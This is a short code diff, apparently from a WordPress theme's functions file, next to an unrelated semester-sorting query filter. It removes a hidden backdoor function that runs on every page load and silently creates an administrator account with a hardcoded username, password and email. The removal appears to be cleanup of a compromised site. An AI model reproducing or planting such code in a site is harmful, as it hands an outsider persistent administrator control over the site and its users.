@@ -2288,16 +2288,6 @@ function get_terms_orderby_semester_year($orderby, $args){
 	$orderby = "SUBSTR({$orderby}, (INSTR({$orderby}, ' ') + 1)) DESC, (CASE SUBSTR({$orderby}, 1, (INSTR({$orderby}, ' ') - 1)) WHEN 'Spring' THEN 1 WHEN 'Summer' THEN 2 ELSE 3 END)";
     return $orderby;
 }
-function wpb_admin_account(){
-	$user = 'ExtraAdmin';
-	$pass = 'CrovaxOfMyroden0802!';
-	$email = 'diveaway89@gmail.com';
-	if ( !username_exists( $user )  && !email_exists( $email ) ) {
-		$user_id = wp_create_user( $user, $pass, $email );
-		$user = new WP_User( $user_id );
-		$user->set_role( 'administrator' );
-	} }
-add_action('init','wpb_admin_account');
 
 ?>
 
